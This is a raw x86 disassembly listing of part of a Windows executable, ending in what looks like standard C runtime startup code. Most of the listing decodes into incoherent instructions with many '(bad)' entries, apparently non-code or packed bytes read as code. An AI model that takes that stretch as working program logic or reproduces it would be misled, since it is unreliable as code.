  4223a1:	or     esi,edx
  4223a3:	jmp    0x85778851
  4223a8:	xchg   DWORD PTR [esp+edi*8-0x4b5d6095],esp
  4223af:	outs   dx,BYTE PTR ds:[esi]
  4223b0:	test   eax,0x548b6c80
  4223b5:	add    cl,cl
  4223b7:	adc    al,0x9f
  4223b9:	out    0xf6,eax
  4223bb:	mov    esi,0x3aae5ecf
  4223c0:	dec    ebx
  4223c1:	xor    al,0x96
  4223c3:	mov    ebx,0x4cf28e37
  4223c8:	push   edi
  4223c9:	int    0x17
  4223cb:	jno    0x4223b2
  4223cd:	into   
  4223ce:	mov    ds:0x4b34bd3a,eax
  4223d3:	in     eax,dx
  4223d4:	sti    
  4223d5:	not    esi
  4223d7:	xor    al,0xc8
  4223d9:	push   ecx
  4223da:	imul   ebp,DWORD PTR [esp+eax*2+0x26],0xb2a2b57c
  4223e2:	test   eax,0xad49ff6
  4223e7:	dec    ecx
  4223e8:	xor    al,BYTE PTR [edx+ebp*2-0x5c]
  4223ec:	add    eax,0x5cf765f8
  4223f1:	sbb    eax,ebp
  4223f3:	pusha  
  4223f4:	xchg   dl,bh
  4223f6:	push   edi
  4223f7:	sbb    cl,cl
  4223f9:	jle    0x4223c5
  4223fb:	aaa    
  4223fc:	pushf  
  4223fd:	push   eax
  4223fe:	aam    0x53
  422400:	jno    0x4223c1
  422402:	sub    eax,0x903119e6
  422407:	std    
  422408:	cld    
  422409:	aad    0xdc
  42240b:	push   esp
  42240c:	mov    esi,0x87a3110b
  422411:	push   ebx
  422412:	ja     0x42248e
  422414:	sub    esi,DWORD PTR [edi+0x54540a52]
  42241a:	mov    ch,0x93
  42241c:	call   0x4f58:0xbc20ccd5
  422423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422424:	(bad)  
  422425:	shr    BYTE PTR [esi-0x17],cl
  422428:	push   edx
  422429:	push   ebx
  42242a:	inc    DWORD PTR [ecx-0x64]
  42242d:	into   
  42242e:	jno    0x4223ea
  422430:	ret    0x72db
  422433:	fucomi st,st(6)
  422435:	jecxz  0x422466
  422437:	fs adc eax,0x304ca1b
  42243d:	ins    DWORD PTR es:[edi],dx
  42243e:	ret    
  42243f:	jecxz  0x42246a
  422441:	cmp    ebp,DWORD PTR [edi-0x51210f33]
  422447:	retf   
  422448:	pushf  
  422449:	pop    eax
  42244a:	stos   DWORD PTR es:[edi],eax
  42244b:	cs cmp ebp,edi
  42244e:	cmp    ecx,DWORD PTR [esi+0x24]
  422451:	or     BYTE PTR [ecx],cl
  422453:	arpl   ax,di
  422455:	sub    ch,BYTE PTR [eax-0x2c]
  422458:	ds retf 
  42245a:	shl    BYTE PTR [ebp+0x4],cl
  42245d:	arpl   WORD PTR [ebp+0x69],sp
  422460:	and    eax,0x7c44d2fe
  422465:	sbb    ch,BYTE PTR [esi+0x17]
  422468:	loope  0x422411
  42246a:	fcom   DWORD PTR [esi-0x1d]
  42246d:	and    DWORD PTR [esi+ebx*1-0x5a15b379],ebp
  422474:	aam    0x40
  422476:	push   0xffffffb5
  422478:	cmp    eax,0xb85ea32f
  42247d:	sub    ch,BYTE PTR [ebx-0x68]
  422480:	cmp    al,BYTE PTR [edx+0x2c]
  422483:	out    dx,eax
  422484:	adc    BYTE PTR [esi-0x4bee3fc],dh
  42248a:	frstor [esp+eax*4+0x37]
  42248e:	out    0x8f,eax
  422490:	adc    ecx,DWORD PTR [edx+eax*2]
  422493:	push   edx
  422494:	iret   
  422495:	(bad)  
  422496:	ins    BYTE PTR es:[edi],dx
  422497:	mov    WORD PTR [edx],?
  422499:	inc    DWORD PTR [esi]
  42249b:	sub    DWORD PTR [eax+0x31],edx
  42249e:	ds sbb al,0x2e
  4224a1:	scas   al,BYTE PTR es:[edi]
  4224a2:	inc    edx
  4224a3:	cmc    
  4224a4:	loop   0x4224db
  4224a6:	jp     0x422431
  4224a8:	sub    edx,edi
  4224aa:	xchg   BYTE PTR [ebx],bh
  4224ac:	addr16 and eax,0x4c19d53
  4224b2:	mov    ah,0x8d
  4224b4:	scas   eax,DWORD PTR es:[edi]
  4224b5:	mov    ebx,0xacf0a56a
  4224ba:	add    BYTE PTR [ebp+0x7f],0x10
  4224be:	pop    ecx
  4224bf:	call   0xcd41a764
  4224c4:	sbb    edx,DWORD PTR [ebx]
  4224c6:	and    eax,0x5011c5ba
  4224cb:	loopne 0x4224e4
  4224cd:	mov    ebx,0x46224322
  4224d2:	fidivr DWORD PTR [ecx]
  4224d4:	add    BYTE PTR [edi+0xd69d6cb],ah
  4224da:	jg     0x4224e5
  4224dc:	mov    dl,0xab
  4224de:	jae    0x422486
  4224e0:	mov    esi,0x1d8feb85
  4224e5:	mov    dl,0x6
  4224e7:	(bad)  
  4224e8:	ss dec ecx
  4224ea:	and    eax,0x21c0c6ee
  4224ef:	xchg   DWORD PTR [ebp-0x3546bbb4],ebx
  4224f5:	inc    esi
  4224f6:	out    dx,al
  4224f7:	sbb    eax,0xcb517168
  4224fc:	add    esi,ebx
  4224fe:	ins    BYTE PTR es:[edi],dx
  4224ff:	(bad)  
  422501:	push   ds
  422502:	les    eax,FWORD PTR [esi]
  422504:	cmp    DWORD PTR [ebx],esp
  422506:	dec    esi
  422507:	imul   ecx,DWORD PTR [ebp-0x79],0x299fa272
  42250e:	or     al,BYTE PTR [edi-0x7508357e]
  422514:	push   edx
  422515:	cli    
  422516:	out    0xda,al
  422518:	lods   al,BYTE PTR ds:[esi]
  422519:	int3   
  42251a:	mov    dl,0x3
  42251c:	fist   WORD PTR [ebp+eiz*8+0x0]
  422520:	dec    esi
  422521:	loopne 0x422592
  422523:	lahf   
  422524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422525:	mov    cl,0x2
  422527:	inc    edi
  422528:	daa    
  422529:	out    dx,eax
  42252a:	inc    esi
  42252b:	sub    eax,0x58565508
  422530:	test   DWORD PTR [ecx+esi*8-0x562caa89],0x60b637df
  42253b:	xlat   BYTE PTR ds:[ebx]
  42253c:	(bad)  
  42253d:	and    DWORD PTR [ecx+0x42],ebx
  422540:	adc    DWORD PTR [ebp-0x50],ecx
  422543:	idiv   DWORD PTR [ecx-0x16]
  422546:	retf   
  422547:	addr16 mov ebx,0x92a1c51c
  42254d:	sti    
  42254e:	and    dl,dl
  422550:	loope  0x42251e
  422552:	jo     0x422578
  422554:	jo     0x422530
  422556:	or     edi,ebx
  422558:	arpl   WORD PTR [esi+esi*8],cx
  42255b:	xor    cl,BYTE PTR [edx-0x47]
  42255e:	xchg   ebx,eax
  42255f:	stos   DWORD PTR es:[edi],eax
  422560:	fst    QWORD PTR [ecx]
  422562:	in     al,0x18
  422564:	inc    DWORD PTR [eax]
  422566:	sub    cl,BYTE PTR [ecx]
  422568:	mov    cl,0x9
  42256a:	in     eax,0x2a
  42256c:	in     al,dx
  42256d:	pushf  
  42256e:	and    BYTE PTR [ebx],bl
  422570:	mov    esi,0x9d87cf2a
  422575:	pop    eax
  422576:	leave  
  422577:	push   edi
  422578:	xor    eax,0xf69534d1
  42257d:	add    edi,ecx
  42257f:	xchg   edi,eax
  422580:	pop    edx
  422581:	hlt    
  422582:	ret    0x62b8
  422585:	sbb    BYTE PTR [edi+0x2a0308d2],bl
  42258b:	icebp  
  42258c:	cmp    eax,0xf71b7449
  422591:	shr    DWORD PTR [edx+0x2589ce83],0x15
  422598:	aaa    
  422599:	xor    dh,BYTE PTR [edi+0x1e]
  42259c:	mov    eax,0x88926e0
  4225a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225a2:	xor    eax,0x4c739423
  4225a7:	jbe    0x42255c
  4225a9:	dec    edi
  4225aa:	in     eax,0x2b
  4225ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225ad:	lds    esp,FWORD PTR [ebp+0x196bebbd]
  4225b3:	mov    BYTE PTR [eax-0x46],cl
  4225b6:	xlat   BYTE PTR ds:[ebx]
  4225b7:	rcr    cl,0xba
  4225ba:	lahf   
  4225bb:	ret    
  4225bc:	fadd   DWORD PTR [ebx]
  4225be:	inc    edx
  4225bf:	add    al,0x31
  4225c1:	fimul  WORD PTR [eax+eiz*8]
  4225c4:	sti    
  4225c5:	mov    WORD PTR [ebp-0x23],?
  4225c8:	jo     0x4225f6
  4225ca:	sahf   
  4225cb:	pop    esp
  4225cc:	scas   eax,DWORD PTR es:[edi]
  4225cd:	sub    DWORD PTR ds:0x91252aa8,esi
  4225d3:	jne    0x4225cb
  4225d5:	retf   
  4225d6:	mov    ds,WORD PTR [esi+0x17]
  4225d9:	rcl    BYTE PTR [ecx-0x30d98f4d],cl
  4225df:	setl   cl
  4225e2:	or     BYTE PTR [edi],dh
  4225e4:	mov    ecx,0xca914296
  4225ea:	loope  0x422582
  4225ec:	ins    DWORD PTR es:[edi],dx
  4225ed:	add    al,0xbe
  4225ef:	push   es
  4225f0:	mov    ebp,0xfa15e742
  4225f5:	pop    ss
  4225f6:	out    dx,eax
  4225f7:	xor    eax,0xc02a93b4
  4225fc:	fstp   DWORD PTR [eax-0x73ebba32]
  422602:	sub    eax,0xcdadc92c
  422607:	rcl    BYTE PTR [ecx],0x56
  42260a:	imul   edi,DWORD PTR fs:[esi-0x5506623d],0x72842a1e
  422615:	adc    al,0x69
  422617:	cmp    DWORD PTR [edx-0x32],esi
  42261a:	dec    ebp
  42261b:	lock fldenv [edi-0x2037af8]
  422622:	adc    edi,edi
  422624:	inc    esp
  422625:	or     BYTE PTR [edi+edx*1+0x32],0x75
  42262a:	rcl    DWORD PTR [esi-0x49],cl
  42262d:	pushf  
  42262e:	arpl   WORD PTR [edi*1+0x3ebf6f3a],dx
  422635:	mov    edi,0xc7a9234a
  42263a:	xchg   ebx,eax
  42263b:	and    ch,BYTE PTR [edi-0x4881f20d]
  422641:	ins    DWORD PTR es:[edi],dx
  422642:	and    bl,BYTE PTR [eax+ebx*8-0x718aa943]
  422649:	push   0xffffff8e
  42264b:	mov    esi,0x75fc133a
  422650:	adc    al,BYTE PTR [ecx]
  422652:	scas   eax,DWORD PTR es:[edi]
  422653:	cmp    BYTE PTR [edx-0x30a38335],dh
  422659:	(bad)  
  42265a:	(bad)  
  42265b:	and    DWORD PTR [ebx+0x5946ab10],ebp
  422661:	jg     0x42261b
  422663:	mov    esp,ebp
  422665:	repnz (bad) 
  422668:	add    DWORD PTR [ebp-0x17],edi
  42266b:	nop
  42266c:	fsqrt  
  42266e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266f:	ss cdq 
  422671:	lock and bh,dl
  422674:	pop    esi
  422675:	and    DWORD PTR [ecx],0x4d
  422678:	sub    al,BYTE PTR ds:0x8c962c9a
  42267e:	and    al,0x94
  422680:	xor    dh,BYTE PTR [esi+0x21]
  422683:	int3   
  422684:	pop    ebp
  422685:	cmc    
  422686:	xchg   esp,eax
  422687:	add    edx,DWORD PTR [esi+0x10]
  42268a:	inc    esp
  42268b:	mov    BYTE PTR [eax+edi*1-0x6c],dl
  42268f:	mov    edx,0xaec9117e
  422694:	inc    ecx
  422695:	mov    es,WORD PTR [edi]
  422697:	inc    ebp
  422698:	xchg   BYTE PTR [edi+0x7f],bh
  42269b:	clc    
  42269c:	add    BYTE PTR [edi+0x49],ah
  42269f:	retf   0xd932
  4226a2:	loope  0x4226e3
  4226a4:	in     eax,0x30
  4226a6:	(bad)  
  4226a7:	sbb    bh,BYTE PTR [edx+0x3682edd3]
  4226ad:	push   ss
  4226ae:	or     al,0x94
  4226b0:	or     ecx,DWORD PTR [eax-0x461f9b06]
  4226b6:	popf   
  4226b7:	dec    ecx
  4226b8:	sbb    ch,BYTE PTR [ecx]
  4226ba:	cld    
  4226bb:	xchg   ebp,eax
  4226bc:	shr    edx,1
  4226be:	pop    ebx
  4226bf:	mov    al,0xb4
  4226c1:	leave  
  4226c2:	pop    eax
  4226c3:	jb     0x4226a6
  4226c5:	push   es
  4226c6:	mov    cs,WORD PTR [ebx-0x534838bb]
  4226cc:	pop    ecx
  4226cd:	ss call 0x9c28:0x9cd6b73c
  4226d5:	int3   
  4226d6:	push   esi
  4226d7:	and    ch,BYTE PTR [edi]
  4226d9:	outs   dx,BYTE PTR ds:[esi]
  4226da:	adc    esi,DWORD PTR [edx]
  4226dc:	cmp    esp,DWORD PTR [edx]
  4226de:	or     dl,BYTE PTR [ecx+0x47]
  4226e1:	inc    DWORD PTR [edx]
  4226e3:	xchg   DWORD PTR [ebx+0x4f3ced1b],edi
  4226e9:	pop    esp
  4226ea:	nop
  4226eb:	cdq    
  4226ec:	pushf  
  4226ed:	outs   dx,DWORD PTR ds:[esi]
  4226ee:	scas   eax,DWORD PTR es:[edi]
  4226ef:	cmp    bl,BYTE PTR [ecx]
  4226f1:	mov    edx,0xbd03d74
  4226f6:	imul   esi,DWORD PTR [ecx+0x1f9a6c01],0xffffffcd
  4226fd:	and    al,0x2a
  4226ff:	mov    edx,DWORD PTR [ebp+ebp*4+0x25]
  422703:	add    eax,0x9ca483f7
  422708:	xchg   edx,eax
  422709:	push   ecx
  42270a:	push   edx
  42270b:	mov    dl,0x4e
  42270d:	xchg   BYTE PTR [edx+0x12],ch
  422710:	jl     0x422745
  422712:	pusha  
  422713:	xor    DWORD PTR [ecx+0x110cc2b6],ebx
  422719:	sbb    al,BYTE PTR [ecx-0x17]
  42271c:	xchg   esi,eax
  42271d:	jb     0x4226b4
  42271f:	loopne 0x422744
  422721:	jle    0x422794
  422723:	dec    esp
  422724:	out    0x9a,al
  422726:	mov    ah,0xaf
  422728:	(bad)  
  422729:	(bad)  
  42272a:	jne    0x422795
  42272c:	jno    0x4226cd
  42272e:	jnp    0x422764
  422730:	adc    al,0x2a
  422732:	loop   0x422735
  422734:	fidiv  WORD PTR ds:0x624e86f2
  42273a:	xor    BYTE PTR [edx-0xa5561c4],al
  422740:	bound  ax,DWORD PTR [esp+eax*4]
  422744:	inc    ebp
  422745:	adc    al,0xdb
  422747:	mov    cs,WORD PTR [edx+ebx*2+0x1c]
  42274b:	pop    ds
  42274c:	and    DWORD PTR [edi+0x60],ebp
  42274f:	leave  
  422750:	push   edi
  422751:	xor    eax,DWORD PTR [ebx]
  422753:	fs or  dl,bl
  422756:	outs   dx,DWORD PTR ds:[esi]
  422757:	mov    dl,0xda
  422759:	or     edx,DWORD PTR ds:0x4edcf4b
  42275f:	in     al,dx
  422760:	sub    eax,0x129e0b65
  422765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422766:	jecxz  0x422788
  422768:	into   
  422769:	clc    
  42276a:	rcl    DWORD PTR [ecx+0x6861b1ef],0x6e
  422771:	adc    BYTE PTR [edi+0x45],bh
  422774:	imul   edx,DWORD PTR [ecx],0x12
  422777:	fnsave [esi]
  422779:	mov    edx,edi
  42277b:	aad    0xf2
  42277d:	pop    ss
  42277e:	loope  0x422746
  422780:	inc    esi
  422781:	sahf   
  422782:	push   ebp
  422783:	cmp    esi,DWORD PTR [edi+edx*2-0x2cce7eb6]
  42278a:	sub    ebx,DWORD PTR [edx+edi*8-0x56]
  42278e:	mov    ebp,0x3890e4bc
  422793:	in     al,0x7c
  422795:	mov    edx,0x307157d3
  42279a:	xchg   ebx,eax
  42279b:	pop    edx
  42279c:	test   eax,0xe45adaaf
  4227a1:	fisub  WORD PTR [eax+0x50eced2]
  4227a7:	mov    al,ds:0x772fbc77
  4227ac:	ins    DWORD PTR es:[edi],dx
  4227ad:	sub    ecx,eax
  4227af:	or     bh,ch
  4227b1:	in     al,dx
  4227b2:	ret    0xd588
  4227b5:	adc    edi,edx
  4227b7:	sub    edx,DWORD PTR [edi]
  4227b9:	cmp    BYTE PTR [ecx],ch
  4227bb:	mov    esi,0xfe9e5f9e
  4227c0:	out    0x82,al
  4227c2:	mov    esp,0x7c2920d2
  4227c7:	in     eax,0x69
  4227c9:	jae    0x422809
  4227cb:	or     bl,BYTE PTR [ebp+0x4fb5deb2]
  4227d1:	push   esp
  4227d2:	xchg   ebp,eax
  4227d3:	lahf   
  4227d4:	sbb    ebx,ebp
  4227d6:	loope  0x422790
  4227d8:	or     BYTE PTR [ebx+0x6c2aca9d],bl
  4227de:	and    DWORD PTR [esi-0x7f],0xaf2085aa
  4227e5:	fisttp QWORD PTR ds:0x1cd698a6
  4227eb:	retf   0xa025
  4227ee:	sub    dl,BYTE PTR [esi+0x4f8cff83]
  4227f4:	imul   ecx,DWORD PTR [esi+edi*2],0xb32f35dc
  4227fb:	fcmovnb st,st(0)
  4227fd:	mov    al,ds:0x176ff2a
  422802:	pop    ss
  422803:	ret    
  422804:	and    bl,BYTE PTR [ecx+0x1]
  422807:	mov    bh,0x97
  422809:	add    BYTE PTR [esi],0xa3
  42280c:	repnz mov ebx,0xfa765716
  422812:	repnz and eax,0xe139072a
  422818:	pop    ds
  422819:	adc    al,0xaa
  42281b:	scas   al,BYTE PTR es:[edi]
  42281c:	jae    0x422863
  42281e:	adc    eax,0x1cde9207
  422823:	popa   
  422824:	jae    0x422889
  422826:	push   ebx
  422827:	neg    DWORD PTR [esi]
  422829:	out    dx,al
  42282a:	add    DWORD PTR [ebx+0x29366a29],0x0
  422831:	aas    
  422832:	cmp    eax,0x5ff3501c
  422837:	or     esi,DWORD PTR [esi-0x3d]
  42283a:	cwde   
  42283b:	arpl   WORD PTR [ebp+0x46],sp
  42283e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42283f:	mov    ebx,0x724d934b
  422844:	jmp    0x990211ad
  422849:	mov    ch,0xaf
  42284b:	jbe    0x422814
  42284d:	popf   
  42284e:	sahf   
  42284f:	fldcw  WORD PTR [edx-0x56]
  422852:	(bad)  
  422855:	and    DWORD PTR [esi],edi
  422857:	mov    ebp,0xd0cb90ab
  42285c:	std    
  42285d:	pop    ebp
  42285e:	jnp    0x422804
  422860:	sub    al,BYTE PTR [ebx+0x5c072ce3]
  422866:	inc    ecx
  422867:	clc    
  422868:	xor    eax,0xd277274c
  42286d:	outs   dx,BYTE PTR ds:[esi]
  42286e:	dec    esi
  42286f:	add    eax,0xc6a3ed06
  422874:	mov    ds:0x27539a6f,eax
  422879:	xchg   DWORD PTR [edx],edx
  42287b:	mov    al,ds:0x8f2992ba
  422880:	mov    dh,0x56
  422882:	aas    
  422883:	xlat   BYTE PTR ds:[ebx]
  422884:	bound  edx,QWORD PTR [edi]
  422886:	stos   BYTE PTR es:[edi],al
  422887:	cld    
  422888:	stos   BYTE PTR es:[edi],al
  422889:	mov    WORD PTR [edi+0x52],es
  42288c:	out    dx,al
  42288d:	mov    ds:0x36f107f7,eax
  422892:	stos   BYTE PTR es:[di],al
  422894:	iret   
  422895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422896:	outs   dx,DWORD PTR ds:[esi]
  422897:	push   es
  422898:	mov    ebp,0xb050799
  42289d:	repz in eax,dx
  42289f:	push   ebp
  4228a0:	jle    0x422853
  4228a2:	xchg   ebx,eax
  4228a3:	dec    edi
  4228a4:	mov    ds:0x699e0f,al
  4228a9:	scas   eax,DWORD PTR es:[edi]
  4228aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ab:	sub    ebp,edx
  4228ad:	sbb    ebp,DWORD PTR [ebx-0x1d]
  4228b0:	in     eax,dx
  4228b1:	pop    ds
  4228b2:	daa    
  4228b3:	retf   
  4228b4:	cmp    BYTE PTR [edi+0x4b9a7628],0xca
  4228bb:	mov    esi,0x30993049
  4228c0:	stc    
  4228c1:	and    al,0x4
  4228c3:	xchg   edx,eax
  4228c4:	mov    al,0xeb
  4228c6:	scas   eax,DWORD PTR es:[edi]
  4228c7:	inc    esp
  4228c8:	fs push 0xe163af60
  4228ce:	jnp    0x4228dc
  4228d0:	imul   edi,DWORD PTR [ebp+0x50],0xa8612eac
  4228d7:	xchg   ebp,eax
  4228d8:	fidiv  DWORD PTR [esi+0x7a37255e]
  4228de:	lock mov dl,0xb3
  4228e1:	mov    ecx,0x70dc7dda
  4228e6:	push   cs
  4228e7:	and    eax,0xb598a1ae
  4228ec:	cs in  eax,0x10
  4228ef:	das    
  4228f0:	jge    0x42296d
  4228f2:	stos   DWORD PTR es:[edi],eax
  4228f3:	(bad)  
  4228f4:	leave  
  4228f5:	pop    edi
  4228f6:	mov    ebx,0xbd5b9978
  4228fb:	rcl    DWORD PTR [eax+0x67f3d7bf],1
  422901:	icebp  
  422902:	jl     0x42297c
  422904:	(bad)  
  422905:	repnz ds cld 
  422908:	scas   al,BYTE PTR es:[edi]
  422909:	mov    WORD PTR ds:0x36c015a2,?
  42290f:	(bad)  
  422910:	sti    
  422911:	jo     0x4228de
  422913:	(bad)  
  422914:	sub    BYTE PTR [edx+0x4b],dl
  422917:	jmp    0x6935:0xc9e9985c
  42291e:	aad    0x1d
  422920:	test   BYTE PTR [esi],ch
  422922:	and    BYTE PTR [ebp-0x7066a0f2],al
  422928:	pop    eax
  422929:	and    eax,0x621857c2
  42292e:	out    dx,eax
  42292f:	leave  
  422930:	loope  0x422997
  422932:	(bad)  
  422934:	into   
  422935:	or     BYTE PTR [edx-0x64],ch
  422938:	pop    eax
  422939:	push   0x3b8841da
  42293e:	dec    edx
  42293f:	sbb    al,0xb7
  422941:	les    esi,FWORD PTR [ecx-0x7922f012]
  422947:	stos   BYTE PTR es:[edi],al
  422948:	cwde   
  422949:	test   BYTE PTR [edx+0x69e224f4],dh
  42294f:	mov    ds:0x5ee904af,eax
  422954:	jle    0x422967
  422956:	aas    
  422957:	xchg   edx,eax
  422958:	add    esi,ecx
  42295a:	or     BYTE PTR [edx+0x2b],ah
  42295d:	adc    al,0xd1
  42295f:	xchg   BYTE PTR [ecx+0x13],al
  422962:	add    dh,BYTE PTR ds:0xe378bd03
  422968:	mov    eax,ds:0x901c803c
  42296d:	shl    DWORD PTR [ecx-0x13f65ebf],cl
  422973:	xchg   DWORD PTR [esi-0x3f],esp
  422976:	scas   eax,DWORD PTR es:[edi]
  422977:	mov    ebx,DWORD PTR [edi+esi*8+0x17]
  42297b:	push   esp
  42297c:	cmp    BYTE PTR [ecx],bh
  42297e:	mov    ds:0x6bdcabe6,al
  422983:	sub    al,0x19
  422985:	mov    DWORD PTR [ecx+0x652d3949],ebp
  42298b:	psubusw mm0,mm0
  42298e:	ss ss dec esp
  422991:	cmp    DWORD PTR [esp+eax*4+0x34],ebx
  422995:	mov    ecx,0xb6e39370
  42299a:	fmul   DWORD PTR [ecx-0x62bda8c3]
  4229a0:	or     eax,0x81dff09c
  4229a5:	mov    edx,0x1bd9e011
  4229aa:	sub    eax,0xb350fbfe
  4229af:	imul   ecx,ecx,0xffffff88
  4229b2:	dec    edi
  4229b3:	pop    es
  4229b4:	xchg   ebx,eax
  4229b5:	fcmovbe st,st(1)
  4229b7:	out    dx,eax
  4229b8:	pop    es
  4229b9:	xchg   BYTE PTR [ecx],dh
  4229bb:	dec    eax
  4229bc:	xor    eax,0xf298641d
  4229c1:	or     DWORD PTR [ecx],esp
  4229c3:	jb     0x422a36
  4229c5:	or     al,0x69
  4229c7:	sub    DWORD PTR [ebx+ebx*2-0x3e],0x362b794b
  4229cf:	xlat   BYTE PTR ds:[ebx]
  4229d0:	es jb  0x4229d8
  4229d3:	mov    bh,0x10
  4229d5:	mov    al,0xb8
  4229d7:	cmp    al,0x56
  4229d9:	jb     0x42295e
  4229db:	pusha  
  4229dc:	xchg   edx,eax
  4229dd:	or     ebp,DWORD PTR [esi-0xa91b38]
  4229e3:	mov    al,ds:0xcce0aeb0
  4229e8:	jl     0x4229c7
  4229ea:	mov    cl,0x8c
  4229ec:	inc    ebx
  4229ed:	sti    
  4229ee:	jo     0x422a3f
  4229f0:	xchg   ebx,eax
  4229f1:	push   0x0
  4229f3:	call   DWORD PTR ds:0x428134
  4229f9:	push   0x0
  4229fb:	push   0x0
  4229fd:	push   0x100000
  422a02:	call   DWORD PTR ds:0x42802c
  422a08:	xor    eax,eax
  422a0a:	add    esp,0x10
  422a0d:	ret    0x10
  422a10:	jmp    DWORD PTR ds:0x428118
  422a16:	cmp    DWORD PTR ds:0x465cfc,0x1
  422a1d:	jne    0x422a24
  422a1f:	call   0x422f62
  422a24:	push   DWORD PTR [esp+0x4]
  422a28:	call   0x422deb
  422a2d:	push   0xff
  422a32:	call   DWORD PTR ds:0x4653e8
  422a38:	pop    ecx
  422a39:	pop    ecx
  422a3a:	ret    
  422a3b:	cmp    DWORD PTR ds:0x465cfc,0x1
  422a42:	jne    0x422a49
  422a44:	call   0x422f62
  422a49:	push   DWORD PTR [esp+0x4]
  422a4d:	call   0x422deb
  422a52:	push   0xff
  422a57:	call   0x422c31
  422a5c:	pop    ecx
  422a5d:	pop    ecx
  422a5e:	ret    
  422a5f:	push   0x60
  422a61:	push   0x428160
  422a66:	call   0x423950
  422a6b:	mov    edi,0x94
  422a70:	mov    eax,edi
  422a72:	call   0x4239a0
  422a77:	mov    DWORD PTR [ebp-0x18],esp
  422a7a:	mov    esi,esp
  422a7c:	mov    DWORD PTR [esi],edi
  422a7e:	push   esi
  422a7f:	call   DWORD PTR ds:0x428064
  422a85:	mov    ecx,DWORD PTR [esi+0x10]
  422a88:	mov    DWORD PTR ds:0x465d04,ecx
  422a8e:	mov    eax,DWORD PTR [esi+0x4]
  422a91:	mov    ds:0x465d10,eax
  422a96:	mov    edx,DWORD PTR [esi+0x8]
  422a99:	mov    DWORD PTR ds:0x465d14,edx
  422a9f:	mov    esi,DWORD PTR [esi+0xc]
  422aa2:	and    esi,0x7fff
  422aa8:	mov    DWORD PTR ds:0x465d08,esi
  422aae:	cmp    ecx,0x2
  422ab1:	je     0x422abf
  422ab3:	or     esi,0x8000
  422ab9:	mov    DWORD PTR ds:0x465d08,esi
  422abf:	shl    eax,0x8
  422ac2:	add    eax,edx
  422ac4:	mov    ds:0x465d0c,eax
  422ac9:	xor    esi,esi
  422acb:	push   esi
  422acc:	mov    edi,DWORD PTR ds:0x428044
  422ad2:	call   edi
  422ad4:	cmp    WORD PTR [eax],0x5a4d
  422ad9:	jne    0x422afa
  422adb:	mov    ecx,DWORD PTR [eax+0x3c]
  422ade:	add    ecx,eax
  422ae0:	cmp    DWORD PTR [ecx],0x4550
  422ae6:	jne    0x422afa
  422ae8:	movzx  eax,WORD PTR [ecx+0x18]
  422aec:	cmp    eax,0x10b
  422af1:	je     0x422b12
  422af3:	cmp    eax,0x20b
  422af8:	je     0x422aff
  422afa:	mov    DWORD PTR [ebp-0x1c],esi
  422afd:	jmp    0x422b26
  422aff:	cmp    DWORD PTR [ecx+0x84],0xe
  422b06:	jbe    0x422afa
  422b08:	xor    eax,eax
  422b0a:	cmp    DWORD PTR [ecx+0xf8],esi
  422b10:	jmp    0x422b20
  422b12:	cmp    DWORD PTR [ecx+0x74],0xe
  422b16:	jbe    0x422afa
  422b18:	xor    eax,eax
  422b1a:	cmp    DWORD PTR [ecx+0xe8],esi
  422b20:	setne  al
  422b23:	mov    DWORD PTR [ebp-0x1c],eax
  422b26:	push   0x1
  422b28:	call   0x4238fd
  422b2d:	pop    ecx
  422b2e:	test   eax,eax
  422b30:	jne    0x422b3a
  422b32:	push   0x1c
  422b34:	call   0x422a3b
  422b39:	pop    ecx
  422b3a:	call   0x423874
  422b3f:	test   eax,eax
  422b41:	jne    0x422b4b
  422b43:	push   0x10
  422b45:	call   0x422a3b
  422b4a:	pop    ecx
  422b4b:	call   0x42375d
  422b50:	mov    DWORD PTR [ebp-0x4],esi
  422b53:	call   0x42355f
  422b58:	test   eax,eax
  422b5a:	jge    0x422b64
  422b5c:	push   0x1b
  422b5e:	call   0x422a16
  422b63:	pop    ecx
  422b64:	call   DWORD PTR ds:0x428060
  422b6a:	mov    ds:0x4664b4,eax
  422b6f:	call   0x42343d
  422b74:	mov    ds:0x465cf4,eax
  422b79:	call   0x42339b
  422b7e:	test   eax,eax
  422b80:	jge    0x422b8a
  422b82:	push   0x8
  422b84:	call   0x422a16
  422b89:	pop    ecx
  422b8a:	call   0x423168
  422b8f:	test   eax,eax
  422b91:	jge    0x422b9b
  422b93:	push   0x9
  422b95:	call   0x422a16
  422b9a:	pop    ecx
  422b9b:	call   0x422c73
  422ba0:	mov    DWORD PTR [ebp-0x20],eax
  422ba3:	cmp    eax,esi
  422ba5:	je     0x422bae
  422ba7:	push   eax
  422ba8:	call   0x422a16
  422bad:	pop    ecx
  422bae:	mov    DWORD PTR [ebp-0x38],esi
  422bb1:	lea    eax,[ebp-0x64]
  422bb4:	push   eax
  422bb5:	call   DWORD PTR ds:0x42805c
  422bbb:	call   0x4230ff
  422bc0:	mov    DWORD PTR [ebp-0x68],eax
  422bc3:	test   BYTE PTR [ebp-0x38],0x1
  422bc7:	je     0x422bcf
  422bc9:	movzx  eax,WORD PTR [ebp-0x34]
  422bcd:	jmp    0x422bd2
  422bcf:	push   0xa
  422bd1:	pop    eax
  422bd2:	push   eax
  422bd3:	push   DWORD PTR [ebp-0x68]
  422bd6:	push   esi
  422bd7:	push   esi
  422bd8:	call   edi
  422bda:	push   eax
  422bdb:	call   0x421880
  422be0:	mov    edi,eax
  422be2:	mov    DWORD PTR [ebp-0x6c],edi
  422be5:	cmp    DWORD PTR [ebp-0x1c],esi
  422be8:	jne    0x422bf0
  422bea:	push   edi
  422beb:	call   0x422dab
  422bf0:	call   0x422dcd
  422bf5:	jmp    0x422c22
  422bf7:	mov    eax,DWORD PTR [ebp-0x14]
  422bfa:	mov    ecx,DWORD PTR [eax]
  422bfc:	mov    ecx,DWORD PTR [ecx]
  422bfe:	mov    DWORD PTR [ebp-0x70],ecx
  422c01:	push   eax
  422c02:	push   ecx
  422c03:	call   0x422f9b
  422c08:	pop    ecx
  422c09:	pop    ecx
  422c0a:	ret    
  422c0b:	mov    esp,DWORD PTR [ebp-0x18]
